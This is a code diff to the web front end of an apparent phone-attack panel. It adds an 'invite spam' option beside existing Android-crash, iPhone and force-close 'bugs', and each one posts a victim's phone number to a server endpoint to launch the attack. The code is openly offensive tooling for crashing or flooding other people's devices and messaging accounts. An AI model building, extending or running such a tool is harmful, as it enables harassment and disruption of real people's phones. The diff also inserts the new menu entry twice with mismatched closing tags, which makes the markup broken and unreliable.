@@ -500,7 +500,6 @@
             <button class="method-trigger-btn" onclick="toggleAttackMethods()">
                 <i class="fas fa-skull-crossbones"></i>  Choose Attack  <i class="fas fa-chevron-down"></i>
             </button>
-
             <div class="grid-container" id="gridMenu">
                 <div class="grid-item selected" onclick="selectBug(this, 'crash_android')">
                     <i class="fab fa-android"></i>
@@ -517,6 +516,15 @@
                 <div class="grid-item" onclick="selectBug(this, 'force_close')">
                     <i class="fas fa-ban"></i>
                     <span>FORCE CLOSE</span>
+                </div>
+                <div class="grid-item" onclick="selectBug(this, 'group_invite_spam')">
+                    <i class="fas fa-envelope-open-text"></i>
+                    <span>INVITE SPAM</span>
+                </div>
+            </div>
+                <div class="grid-item" onclick="selectBug(this, 'group_invite_spam')">
+                    <i class="fas fa-envelope-open-text"></i>
+                    <span>INVITE SPAM</span>
                 </div>
             </div>
 
@@ -773,6 +781,7 @@
             showToast("INITIALIZING PAYLOAD", "success");
 
             let endpoint = "/sy3"; 
+            let bodyData = { deviceCode: deviceCode, targetNumber: num };
 
             if (selectedMethod === 'iphone_hard') {
                 endpoint = "/sy"; 
@@ -780,6 +789,8 @@
                 endpoint = "/sy3"; 
             } else if (selectedMethod === 'force_close') {
                 endpoint = "/sy2"; 
+            } else if (selectedMethod === 'group_invite_spam') {
+                endpoint = "/sygc"; 
             } else {
                 endpoint = "/sy2"; 
             }
@@ -788,10 +799,7 @@
                 const res = await fetch(SERVER_URL + endpoint, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        deviceCode: deviceCode,
-                        targetNumber: num 
-                    })
+                    body: JSON.stringify(bodyData)
                 });
                 const data = await res.json();
                 
